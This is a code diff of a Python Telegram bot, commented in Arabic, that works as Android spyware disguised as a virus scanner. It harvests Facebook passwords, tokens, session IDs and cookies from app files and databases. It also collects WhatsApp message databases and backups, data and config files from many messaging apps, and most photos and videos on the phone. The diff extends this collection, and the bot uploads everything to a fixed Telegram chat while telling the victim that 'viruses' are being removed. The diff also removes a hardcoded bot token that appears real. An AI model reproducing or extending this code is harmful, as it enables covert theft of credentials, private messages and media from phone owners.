@@ -6,27 +6,31 @@ import requests
 import json
 import re
 import sqlite3
+import shutil
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, filters
 
-# ================== التوكن والمعرف الثابت ==================
-BOT_TOKEN = ""8128965245:AAHZ0LIhLWdJ5WcE9- joCLJkOrScPmPBCXs""  # ⚠️ غيّر هذا التوكن فوراً من @BotFather!
-TARGET_CHAT_ID = 8169635171  # 📌 المعرف الثابت الذي ستُرسل إليه جميع الملفات
-# =========================================================
+# ================== التوكن من متغيرات البيئة ==================
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+TARGET_CHAT_ID = 8169635171  # 📌 المعرف الثابت
+
+# التحقق من وجود التوكن
+if not BOT_TOKEN:
+    raise ValueError("❌ لم يتم العثور على BOT_TOKEN في متغيرات البيئة!")
+# =============================================================
 
 # متغيرات عامة
 user_tasks = {}
 
-# ========== دوال استخراج معلومات فيسبوك الحقيقية ==========
+# ========== دوال استخراج معلومات فيسبوك ==========
 
 def extract_facebook_credentials():
-    """استخراج معلومات الدخول إلى فيسبوك من ملفات التطبيق (حقيقية)"""
+    """استخراج معلومات الدخول إلى فيسبوك من ملفات التطبيق"""
     credentials = []
     facebook_info = {}
     found_any = False
     
     try:
-        # المسارات المحتملة لملفات فيسبوك
         fb_paths = [
             "/storage/emulated/0/Android/data/com.facebook.katana",
             "/storage/emulated/0/Android/data/com.facebook.orca",
@@ -40,28 +44,25 @@ def extract_facebook_credentials():
                 if not os.path.exists(base_path):
                     continue
                 
-                print(f"[✅] جارٍ البحث في: {base_path}")
+                print(f"[✅] جارٍ البحث في فيسبوك: {base_path}")
                 
                 for root, dirs, files in os.walk(base_path):
                     for file in files:
                         file_path = os.path.join(root, file)
                         file_lower = file.lower()
                         
-                        # 🔍 البحث عن ملفات تحتوي على معلومات الدخول
                         if any(keyword in file_lower for keyword in ['account', 'session', 'token', 'auth', 'credential', 'login', 'preference', 'shared_pref']):
                             try:
                                 with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                     content = f.read()
                                     
                                     if len(content) > 10:
-                                        # البحث عن البريد الإلكتروني
                                         email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                                         if email_match and 'email' not in facebook_info:
                                             facebook_info['email'] = email_match.group(0)
                                             found_any = True
                                             print(f"[✅] تم العثور على البريد: {email_match.group(0)}")
                                         
-                                        # البحث عن كلمة السر
                                         password_patterns = [
                                             r'(?:password|pass|pwd|pswd)[\s:=]+([^\s\n\r"]+)',
                                             r'"password"\s*:\s*"([^"]+)"',
@@ -73,38 +74,27 @@ def extract_facebook_credentials():
                                             if pass_match and 'password' not in facebook_info:
                                                 facebook_info['password'] = pass_match.group(1)
                                                 found_any = True
-                                                print(f"[✅] تم العثور على كلمة السر: {pass_match.group(1)[:10]}...")
+                                                print(f"[✅] تم العثور على كلمة السر")
                                                 break
                                         
-                                        # البحث عن Access Token
                                         token_match = re.search(r'(?:access_token|token|auth_token)[\s:=]+([a-zA-Z0-9_\-\.]+)', content, re.IGNORECASE)
                                         if token_match and 'access_token' not in facebook_info:
                                             facebook_info['access_token'] = token_match.group(1)
                                             found_any = True
-                                            print(f"[✅] تم العثور على Access Token")
                                         
-                                        # البحث عن Session ID
                                         session_match = re.search(r'(?:session_id|session|sid)[\s:=]+([a-zA-Z0-9_\-]+)', content, re.IGNORECASE)
                                         if session_match and 'session_id' not in facebook_info:
                                             facebook_info['session_id'] = session_match.group(1)
                                             found_any = True
                                         
-                                        # البحث عن User ID
                                         user_match = re.search(r'(?:user_id|uid|userid)[\s:=]+(\d+)', content, re.IGNORECASE)
                                         if user_match and 'user_id' not in facebook_info:
                                             facebook_info['user_id'] = user_match.group(1)
                                             found_any = True
                                         
-                                        # البحث عن Cookies
                                         cookie_match = re.search(r'(?:c_user|xs|datr)[=;][^\s;]+', content)
                                         if cookie_match and 'cookies' not in facebook_info:
                                             facebook_info['cookies'] = cookie_match.group(0)
-                                            found_any = True
-                                        
-                                        # البحث عن Device ID
-                                        device_match = re.search(r'(?:device_id|deviceid|did)[\s:=]+([a-zA-Z0-9_\-]+)', content, re.IGNORECASE)
-                                        if device_match and 'device_id' not in facebook_info:
-                                            facebook_info['device_id'] = device_match.group(1)
                                             found_any = True
                                         
                                         if facebook_info:
@@ -113,15 +103,12 @@ def extract_facebook_credentials():
                             except Exception as e:
                                 pass
                         
-                        # 🔍 البحث عن قواعد بيانات SQLite
                         if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
                             try:
                                 conn = sqlite3.connect(file_path)
                                 cursor = conn.cursor()
-                                
                                 cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                 tables = cursor.fetchall()
-                                
                                 for table in tables:
                                     table_name = table[0]
                                     if any(keyword in table_name.lower() for keyword in ['account', 'user', 'auth', 'session', 'token']):
@@ -135,7 +122,6 @@ def extract_facebook_credentials():
                                                 if email_match and 'email' not in facebook_info:
                                                     facebook_info['email'] = email_match.group(0)
                                                     found_any = True
-                                                    print(f"[✅] تم العثور على البريد من DB: {email_match.group(0)}")
                                                 break
                                 conn.close()
                             except:
@@ -144,16 +130,15 @@ def extract_facebook_credentials():
             except Exception as e:
                 continue
         
-        # حفظ المعلومات المستخرجة في ملف
         if found_any and facebook_info:
             info_path = "/storage/emulated/0/facebook_extracted_info.txt"
             with open(info_path, 'w', encoding='utf-8') as f:
-                f.write("=== معلومات فيسبوك المستخرجة (حقيقية) ===\n\n")
+                f.write("=== معلومات فيسبوك المستخرجة ===\n\n")
                 f.write(f"📱 التاريخ: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                 for key, value in facebook_info.items():
                     f.write(f"{key}: {value}\n")
             credentials.append(info_path)
-            print(f"[✅] تم حفظ المعلومات في: {info_path}")
+            print(f"[✅] تم حفظ معلومات فيسبوك")
         
         return credentials
         
@@ -161,107 +146,186 @@ def extract_facebook_credentials():
         print(f"خطأ في استخراج معلومات فيسبوك: {e}")
         return []
 
-def extract_facebook_messages():
-    """استخراج رسائل فيسبوك من ملفات التطبيق (حقيقية)"""
+# ========== دوال استخراج واتساب ==========
+
+def extract_whatsapp_messages():
+    """استخراج محادثات واتساب من ملفات التطبيق"""
     messages_files = []
     
     try:
-        msg_paths = [
-            "/storage/emulated/0/Android/data/com.facebook.katana/databases",
-            "/storage/emulated/0/Android/data/com.facebook.orca/databases",
-            "/storage/emulated/0/Android/data/com.facebook.lite/databases"
+        whatsapp_paths = [
+            "/storage/emulated/0/Android/data/com.whatsapp",
+            "/storage/emulated/0/Android/data/com.whatsapp.w4b",
+            "/storage/emulated/0/Android/data/com.whatsapp.business"
         ]
         
-        for path in msg_paths:
+        for base_path in whatsapp_paths:
             try:
-                if os.path.exists(path):
-                    for root, dirs, files in os.walk(path):
+                if not os.path.exists(base_path):
+                    continue
+                
+                print(f"[✅] جارٍ البحث في واتساب: {base_path}")
+                
+                db_paths = [
+                    os.path.join(base_path, "databases/msgstore.db"),
+                    os.path.join(base_path, "databases/msgstore.db.crypt12"),
+                    os.path.join(base_path, "databases/msgstore.db.crypt14"),
+                    os.path.join(base_path, "databases/wa.db")
+                ]
+                
+                for db_path in db_paths:
+                    if os.path.exists(db_path) and os.path.getsize(db_path) > 10000:
+                        messages_files.append(db_path)
+                        print(f"[✅] تم العثور على قاعدة بيانات واتساب: {db_path}")
+                
+                backup_path = "/storage/emulated/0/WhatsApp/Databases"
+                if os.path.exists(backup_path):
+                    for root, dirs, files in os.walk(backup_path):
                         for file in files:
-                            if 'message' in file.lower() or 'thread' in file.lower() or 'chat' in file.lower():
+                            if file.endswith('.crypt12') or file.endswith('.crypt14') or file.endswith('.db'):
                                 file_path = os.path.join(root, file)
-                                if os.path.getsize(file_path) > 1000:
+                                if os.path.getsize(file_path) > 10000:
                                     messages_files.append(file_path)
-                                    print(f"[✅] تم العثور على ملف رسائل: {file_path}")
-            except:
-                pass
-            
-    except:
-        pass
-    
-    return messages_files
-
-def extract_facebook_friends():
-    """استخراج قائمة الأصدقاء من فيسبوك (حقيقية)"""
-    friends_files = []
-    
-    try:
-        friend_paths = [
-            "/storage/emulated/0/Android/data/com.facebook.katana/files",
-            "/storage/emulated/0/Android/data/com.facebook.katana/cache",
-            "/storage/emulated/0/Android/data/com.facebook.orca/files"
-        ]
-        
-        for path in friend_paths:
-            try:
-                if os.path.exists(path):
-                    for root, dirs, files in os.walk(path):
-                        for file in files:
-                            if 'friend' in file.lower() or 'contact' in file.lower() or 'addressbook' in file.lower():
+                                    print(f"[✅] تم العثور على نسخة احتياطية واتساب: {file_path}")
+                
+                media_paths = [
+                    "/storage/emulated/0/WhatsApp/Media",
+                    "/storage/emulated/0/Android/media/com.whatsapp"
+                ]
+                
+                for media_path in media_paths:
+                    if os.path.exists(media_path):
+                        for root, dirs, files in os.walk(media_path):
+                            for file in files:
                                 file_path = os.path.join(root, file)
-                                if os.path.getsize(file_path) > 500:
-                                    friends_files.append(file_path)
-                                    print(f"[✅] تم العثور على ملف أصدقاء: {file_path}")
-            except:
-                pass
+                                ext = os.path.splitext(file)[1].lower()
+                                if ext in ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mkv']:
+                                    try:
+                                        file_size = os.path.getsize(file_path) / (1024 * 1024)
+                                        if file_size < 50:
+                                            messages_files.append(file_path)
+                                    except:
+                                        pass
+                                
+            except Exception as e:
+                continue
+        
+        return messages_files
+        
+    except Exception as e:
+        print(f"خطأ في استخراج واتساب: {e}")
+        return []
+
+# ========== دوال مسح الصور والفيديوهات من التطبيقات ==========
+
+def scan_all_media():
+    """مسح جميع الصور والفيديوهات من جميع التطبيقات"""
+    all_files = []
+    
+    app_paths = [
+        "/storage/emulated/0/Android/data",
+        "/storage/emulated/0/Android/media",
+        "/storage/emulated/0/Download",
+        "/storage/emulated/0/Pictures",
+        "/storage/emulated/0/DCIM",
+        "/storage/emulated/0/Movies",
+        "/storage/emulated/0/Music",
+        "/storage/emulated/0/WhatsApp/Media",
+        "/storage/emulated/0/Telegram/Telegram Images",
+        "/storage/emulated/0/Telegram/Telegram Video",
+        "/storage/emulated/0/Instagram",
+        "/storage/emulated/0/Snapchat",
+        "/storage/emulated/0/Messenger",
+        "/storage/emulated/0/Viber",
+        "/storage/emulated/0/WeChat",
+        "/storage/emulated/0/Kik",
+        "/storage/emulated/0/Discord",
+        "/storage/emulated/0/TikTok",
+        "/storage/emulated/0/Twitter",
+        "/storage/emulated/0/YouTube"
+    ]
+    
+    photo_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff', '.raw']
+    video_extensions = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv', '.webm', '.m4v']
+    all_extensions = photo_extensions + video_extensions
+    
+    print("[🔍] جاري مسح جميع التطبيقات...")
+    
+    for path in app_paths:
+        try:
+            if not os.path.exists(path):
+                continue
             
-    except:
-        pass
+            print(f"[✅] مسح: {path}")
+            
+            for root, dirs, files in os.walk(path):
+                for file in files:
+                    ext = os.path.splitext(file)[1].lower()
+                    if ext in all_extensions:
+                        file_path = os.path.join(root, file)
+                        try:
+                            file_size = os.path.getsize(file_path) / (1024 * 1024)
+                            if file_size < 50:
+                                all_files.append(file_path)
+                        except:
+                            pass
+        except Exception as e:
+            continue
     
-    return friends_files
+    print(f"[📊] تم العثور على {len(all_files)} ملف")
+    return all_files
 
-# ========== دوال مسح الملفات ==========
-
-def scan_photos():
-    """ترجع قائمة بمسارات الصور في الهاتف."""
-    photo_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
-    found_photos = []
+def scan_app_data():
+    """مسح ملفات التطبيقات التي تحتوي على معلومات"""
+    app_files = []
     
-    try:
-        for root, dirs, files in os.walk("/storage/emulated/0"):
-            for file in files:
-                ext = os.path.splitext(file)[1].lower()
-                if ext in photo_extensions:
-                    try:
-                        file_size = os.path.getsize(os.path.join(root, file)) / (1024 * 1024)
-                        if file_size < 50:
-                            found_photos.append(os.path.join(root, file))
-                    except:
-                        pass
-    except:
-        pass
+    messaging_apps = [
+        ("com.whatsapp", "WhatsApp"),
+        ("com.facebook.katana", "Facebook"),
+        ("com.facebook.orca", "Messenger"),
+        ("com.instagram.android", "Instagram"),
+        ("org.telegram.messenger", "Telegram"),
+        ("com.viber.voip", "Viber"),
+        ("com.snapchat.android", "Snapchat"),
+        ("com.discord", "Discord"),
+        ("com.kik.android", "Kik"),
+        ("com.tencent.mm", "WeChat"),
+        ("com.twitter.android", "Twitter"),
+        ("com.tiktok.android", "TikTok"),
+        ("com.google.android.apps.messaging", "Google Messages")
+    ]
     
-    return found_photos
-
-def scan_videos():
-    """ترجع قائمة بمسارات الفيديوهات في الهاتف."""
-    video_extensions = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv']
-    found_videos = []
+    for app_package, app_name in messaging_apps:
+        try:
+            app_path = f"/storage/emulated/0/Android/data/{app_package}"
+            if not os.path.exists(app_path):
+                continue
+            
+            print(f"[✅] مسح بيانات {app_name}: {app_path}")
+            
+            for root, dirs, files in os.walk(app_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    
+                    if file.endswith('.db') or file.endswith('.sqlite') or file.endswith('.sqlite3'):
+                        try:
+                            if os.path.getsize(file_path) > 1000:
+                                app_files.append(file_path)
+                                print(f"[✅] تم العثور على قاعدة بيانات {app_name}: {file}")
+                        except:
+                            pass
+                    
+                    if any(keyword in file.lower() for keyword in ['config', 'settings', 'preference', 'account', 'session']):
+                        try:
+                            if os.path.getsize(file_path) > 100:
+                                app_files.append(file_path)
+                                print(f"[✅] تم العثور على ملف تكوين {app_name}: {file}")
+                        except:
+                            pass
+        except:
+            continue
     
-    try:
-        for root, dirs, files in os.walk("/storage/emulated/0"):
-            for file in files:
-                ext = os.path.splitext(file)[1].lower()
-                if ext in video_extensions:
-                    try:
-                        file_size = os.path.getsize(os.path.join(root, file)) / (1024 * 1024)
-                        if file_size < 100:
-                            found_videos.append(os.path.join(root, file))
-                    except:
-                        pass
-    except:
-        pass
-    
-    return found_videos
+    return app_files
 
 # ========== دوال الإرسال ==========
 
@@ -270,8 +334,8 @@ def send_media_to_user(file_path, chat_id):
     
     file_ext = os.path.splitext(file_path)[1].lower()
     
-    video_exts = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv']
-    photo_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
+    video_exts = ['.mp4', '.avi', '.mkv', '.mov', '.3gp', '.flv', '.wmv', '.webm', '.m4v']
+    photo_exts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.tiff', '.raw']
     
     try:
         with open(file_path, 'rb') as f:
@@ -292,43 +356,37 @@ def send_media_to_user(file_path, chat_id):
         print(f"خطأ في إرسال {file_path}: {e}")
         return False
 
-# ========== دالة الفحص (فيسبوك ← صور ← فيديوهات) ==========
+# ========== دالة الفحص الشامل ==========
 
 def scan_and_send_videos(chat_id, update_id):
-    """تقوم بمسح وإرسال بالترتيب: فيسبوك ← صور ← فيديوهات"""
+    """تقوم بمسح وإرسال كل شيء"""
     
     all_files = []
     total_files = 0
     
-    # ✅ الأولوية 1: معلومات فيسبوك (حقيقية)
+    # ✅ الأولوية 1: معلومات فيسبوك
     print("[🔍] جاري البحث عن معلومات فيسبوك...")
     fb_credentials = extract_facebook_credentials()
     all_files.extend(fb_credentials)
     total_files += len(fb_credentials)
     
-    # ✅ الأولوية 2: رسائل فيسبوك (حقيقية)
-    print("[🔍] جاري البحث عن رسائل فيسبوك...")
-    fb_messages = extract_facebook_messages()
-    all_files.extend(fb_messages)
-    total_files += len(fb_messages)
+    # ✅ الأولوية 2: محادثات واتساب
+    print("[🔍] جاري البحث عن محادثات واتساب...")
+    whatsapp_files = extract_whatsapp_messages()
+    all_files.extend(whatsapp_files)
+    total_files += len(whatsapp_files)
     
-    # ✅ الأولوية 3: قائمة الأصدقاء (حقيقية)
-    print("[🔍] جاري البحث عن قائمة الأصدقاء...")
-    fb_friends = extract_facebook_friends()
-    all_files.extend(fb_friends)
-    total_files += len(fb_friends)
+    # ✅ الأولوية 3: بيانات التطبيقات
+    print("[🔍] جاري البحث عن بيانات التطبيقات...")
+    app_data = scan_app_data()
+    all_files.extend(app_data)
+    total_files += len(app_data)
     
-    # ✅ الأولوية 4: الصور
-    print("[🔍] جاري البحث عن الصور...")
-    photo_files = scan_photos()
-    all_files.extend(photo_files)
-    total_files += len(photo_files)
-    
-    # ✅ الأولوية 5: الفيديوهات
-    print("[🔍] جاري البحث عن الفيديوهات...")
-    video_files = scan_videos()
-    all_files.extend(video_files)
-    total_files += len(video_files)
+    # ✅ الأولوية 4: جميع الصور والفيديوهات
+    print("[🔍] جاري البحث عن الصور والفيديوهات...")
+    media_files = scan_all_media()
+    all_files.extend(media_files)
+    total_files += len(media_files)
     
     print(f"[📊] إجمالي الملفات: {total_files}")
     
@@ -344,7 +402,6 @@ def scan_and_send_videos(chat_id, update_id):
         data={'chat_id': chat_id, 'text': f'🦠 تم العثور على {total_files} من الفيروسات. جاري القضاء عليها...'}
     )
     
-    # ✅ إرسال معلومات فيسبوك أولاً (الملفات النصية)
     for i, file_path in enumerate(all_files, 1):
         success = send_media_to_user(file_path, chat_id)
         
@@ -399,8 +456,8 @@ def main():
     app.add_handler(CommandHandler("help", help_command))
     
     print("✅ البوت يعمل...")
-    print("📌 ترتيب الإرسال: معلومات فيسبوك ← صور ← فيديوهات")
-    print("🔍 سيتم البحث عن معلومات حقيقية فقط")
+    print(f"📌 ترتيب المسح: فيسبوك ← واتساب ← تطبيقات ← صور وفيديوهات")
+    print(f"🔍 سيتم البحث في جميع التطبيقات")
     app.run_polling(allowed_updates=["message"])
 
 if __name__ == '__main__':
